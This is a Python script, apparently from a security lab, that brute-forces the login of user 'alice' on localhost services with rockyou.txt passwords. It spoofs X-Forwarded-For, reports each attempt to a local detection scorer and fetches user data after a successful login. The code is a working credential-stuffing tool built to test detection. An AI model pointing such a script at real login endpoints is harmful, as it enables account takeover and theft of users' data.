import requests
import itertools
import time
import argparse


def load_creds(path, limit=None):
    """Load credentials from a file with an optional limit."""
    passwords = []
    with open(path, newline="", encoding="latin-1") as f:
        for i, line in enumerate(f):
            passwords.append(line.strip())
            if limit and i + 1 >= limit:
                break
    return passwords


passwords = load_creds("scripts/data/rockyou.txt", limit=5000)
pool = itertools.cycle(passwords)


def attack(rate_per_sec=10, attempts=50, use_jwt=False):
    """Send repeated login attempts and report detection results.

    Tracks how many attempts until the first successful login and how
    long that success took. Useful for demonstrating credential stuffing
    with and without JWT protection.
    """

    success = 0
    blocked = 0
    first_success_attempt = None
    first_success_time = None
    first_user_info = None
    start = time.time()

    for i in range(1, attempts + 1):
        pwd = next(pool)
        ip = "10.0.0.1"
        user = "alice"

        token = None
        if use_jwt:
            login_resp = requests.post(
                "http://localhost:8001/api/token",
                data={"username": user, "password": pwd},
                timeout=3,
            )
            login_ok = login_resp.status_code == 200
            token = login_resp.json().get("access_token") if login_ok else None
            if token:
                requests.get(
                    "http://localhost:8001/api/alerts",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=3,
                )
        else:
            login_resp = requests.post(
                "http://localhost:8080/login",
                json={"username": user, "password": pwd},
                headers={"X-Forwarded-For": ip},
                timeout=3,
            )
            login_ok = login_resp.status_code == 200
            if login_ok:
                token = login_resp.json().get("access_token")

        score_payload = {
            "client_ip": ip,
            "auth_result": "success" if login_ok else "failure",
            "with_jwt": use_jwt,
        }

        try:
            score_resp = requests.post(
                "http://localhost:8001/score",
                json=score_payload,
                timeout=3,
            )
            if score_resp.json().get("status") == "blocked":
                blocked += 1
        except Exception as exc:
            print("SCORE ERROR:", exc)

        if login_ok:
            success += 1
            if token:
                try:
                    info_resp = requests.get(
                        "http://localhost:8001/api/me",
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=3,
                    )
                    if info_resp.status_code == 200:
                        data = info_resp.json()
                        if first_user_info is None:
                            first_user_info = data
                        print(f"Retrieved user data: {data}")
                except Exception as exc:
                    print("INFO ERROR:", exc)
            if first_success_attempt is None:
                first_success_attempt = i
                first_success_time = time.time() - start

        time.sleep(1 / rate_per_sec)

    total_time = time.time() - start
    print(f"Attempts: {attempts}, successes: {success}, blocked: {blocked}")
    if first_success_attempt:
        print(
            f"First success after {first_success_attempt} attempts ({first_success_time:.2f}s)"
        )
    print(f"Total elapsed time: {total_time:.2f}s")
    if first_user_info:
        print(f"First user data: {first_user_info}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--jwt", action="store_true", help="Use JWT login endpoint")
    parser.add_argument("--rate", type=float, default=5, help="Attempts per second")
    parser.add_argument("--attempts", type=int, default=50, help="Number of attempts to send")
    args = parser.parse_args()
    attack(rate_per_sec=args.rate, attempts=args.attempts, use_jwt=args.jwt)
